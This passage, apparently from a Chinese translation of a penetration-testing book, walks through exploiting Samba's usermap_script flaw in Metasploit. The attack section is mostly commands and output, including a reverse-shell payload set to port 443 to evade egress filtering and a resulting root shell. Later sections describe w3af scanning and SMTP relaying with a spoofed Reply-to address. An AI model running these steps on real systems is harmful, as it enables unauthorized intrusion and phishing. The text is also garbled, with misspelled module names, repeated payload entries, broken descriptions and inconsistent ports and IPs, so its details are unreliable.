
| IP | Port | Protocol | Service | State | Version |
| --- | --- | --- | --- | --- | --- |
| 172.16.189.131 | 8180 | tcp | http | open | Apache Tomcat/Coyote JSP engine 1.1 |

`services` 命令揭示我们正在使用 Samba 文件共享。看看我们是否可以搜索漏洞并利用它。需要注意的是，虽然在这个实例中我们攻击的是一个真实的服务器，但我们并不需要利用 Web 漏洞。攻击者将利用 Web 服务器上运行的所有软件进行访问。

我们看到了几个 Samba 漏洞。它们也有排名。我们将使用 `usermap_script` 漏洞。

一旦设置了负载（payload），我们可以再次发布 `show options` 命令来验证特定于负载的选项。

```
cmd/unix/bind_perl
cmd/unix/bind_perl_ipv6
cmd/unix/bind_ruby
cmd/unix/bind_perl_ipv6
cmd/unix/generic
cmd/unix/reverse
tcp (telnet)
cmd/unix/reverse_netcat
cmd/unix/reverse_ruby
cmd/unix/reverse_python
msf exploit(usermcript) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf exploit(usermcript) > show options
```

- 正常的 Unix Command Shell, Bind TCP (via P)
- 正常的 Unix Command Shell, Bind TCP (via p)
- 正常的 Unix Command Shell, Bind TCP (via R)
- 正常的 Unix Command Shell, Bind TCP (via R)
- 正常的 Unix Command Shell, 通用命令执行
- 正常的 Unix Command Shell, 双反反
- 正常的 Unix Command Shell, 反向 TCP (vi)
- 正常的 Unix Command Shell, 反向 TCP (vi)

我们可以看到这个特定的负载正要求我们设置 `LHOST` 和 `LPORT`。`LHOST` 是本地主机或你的 Metasploit 攻击机。该漏洞会让远程主机连接到托管 Metasploit 的系统，远程主机需要知道你的 IP 地址是什么。

此外，我们还需要设置远程主机与 Metasploit 通信的端口。许多企业环境使用防火墙或路由器限制出站端口。最佳实践是使用常用端口，例如 443 端口，因为它通常保留用于 SSL 流量，而大多数公司允许此类流量出站。此外，发现将 443 作为大多数攻击的 `LPORT` 可以让我们绕过组织可能部署的内部代理工具。

```
RHOST 172.16.189.131 yes 目标地址
RPORT 139 yes 目标端口

负载选项 (cmd/unix/reverse):
名称    当前设置    必须    描述
LHOST                  yes     监听地址
LPORT   4444          yes     监听端口

漏洞目标:
0   自动

msf exploit(usermcript) > set LHOST 172.16.189.55
msf exploit(usermcript) > set LPORT 443
msf exploit(usermcript) > exploit:
```

## 服务端攻击

当我们设置好选项后，可以输入 `exploit` 来运行攻击。当漏洞成功运行时，你将连接到远程服务器。你可以运行任何命令，在这个示例中，这个特定的漏洞提供了 root 权限。root 意味着对目标远程服务器的完全访问权限。

```
msf exploit(userm_script) > set LHOST 172.16.189.5
LHOST => 172.16.189.5
msf exploit(userm_script) > set LPORT 443
LPORT => 443
msf exploit(userm_script) > exploit
```

```
[*] 启动反向处理程序
[*] 接受了第一个客户端连接...
[*] 接受了第二个客户端连接...
[*] 命令: echo BySs63Katb6fiyQ;
[*] 正在写入 socket A
[*] 正在写入 socket B
[*] 正在从 sockets 读取
[*] 正在从 socket 读取
[*] B: "BySs63Katb6fiyQ\n"
[*] 匹配中:
[*] A 正在输入...
[*] 命令会话 1 已打开 (172.16.189.5:443 -> 172.16.189.131:45720) 时间 2023-04-06 15:14:05 -0500
whoami
root
```

如需 http://www.metasploit.com/ 上查看可用选项。

Metasploit 框架中提供了各种漏洞和负载选项。请确保在 http://www.metasploit.com/ 上查看可用选项。

## w3af

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_119_0.png)

w3af（Web Application Attack and Audit Framework 的缩写）是一个开源 Web 应用程序安全扫描和利用工具。可以在 Web Application Assessment（Web 应用评估） | Web Vulnerability Scanners（Web漏洞扫描器）下选择 w3af 进行访问。

w3af 提供了一个向导；但对于正确执行扫描并不是必须的。第一步是创建一个新配置（profile）或利用现有的配置。配置用于对运行在目标上的插件分组。w3af 自带了一些非常棒的默认组，例如 OWASP TOP10。当你选择它们时，现有配置的定义将显示在中间窗口中，如下所示（作为 OWASP TOP10 配置示例）。你可以在左侧列中选择现有的配置或你刚刚创建的新配置。如果你正在使用新配置或编辑现有配置，可以勾选将执行的扫描框框。勾选的插件越多，扫描所需的时间就越长。如果你勾选了大组，w3af 会警告你可能会有长时间延迟。点击 Start 运行扫描。

Open Web Application Security Project (OWASP) 是一个全球性的免费开源社区，致力于提高应用程序软件的安全性。OWASP 搜索并发布了十种常见的安全漏洞。此配置搜索了这些前 10 个漏洞。有关漏洞的更多信息请访问：http://www.owasp.org/index.php/OWASP_Top_Ten_Project。

接下来在 **Target:** 字段中输入 URL 并点击 Start。以下截图显示了设置 w3af 扫描 www.securityblogger.com:

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_120_0.png)

### 服务端攻击

w3af 将 Log 中显示活动扫描的状态。w3af 将尝试预测完成扫描所需的时间。

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_121_0)

要查看扫描结果，请点击 Results 标签。Results 将提供已识别可能漏洞的详情。Exploit 标签将显示可能的漏洞。（img/df1fdcde66c92c1fef83bd651dd5ffe3_121.png）

## 第 3 章

如果我们收到了响应，就可以使用 SMTP 命令操控大多数服务器（根据配置和系统类型，某些系统可能不受影响）。在接下来的示例中，我们首先通过 `HELO` 命令告诉服务器我们是谁。接下来，我们可以使用邮件服务器为未来的客户端攻击中继消息。

`HELLO`、`MAIL FROM`、`RCP TO` 和 `DATA` 是唯一必需的字段。你可以使用其他字段来隐藏电子邮件的发送位置，并更改回复地址（reply-to）。一个示例是更改 `Reply-to` 地址，目的是诱导接收者向其他人发送电子邮件。

```
MAIL FROM: someone_important@cloudcentrics.com
```

可以通过查询 SMTP RFC 命令或使用 Google 搜索找到 SMTP 命令的完整列表。

## 暴力破解

暴力攻击是指对加密数据尝试所有可能的密钥进行检查，直到找到正确的密钥为止。从资源和时间的角度来看，暴力攻击的成本极高，因为攻击者正在利用密钥的长度和简单性来利用加密算法中的漏洞。密码通常基于字典词汇，这使得攻击者需要测试的总测试空间（即匹配字典中的所有单词）远小于使用随机字符的密码。缓解暴力破解攻击的最佳实践是使用长且复杂的密钥，以及在尝试多次后设置超时，以及其他增加更多安全因素的方法。

## Hydra
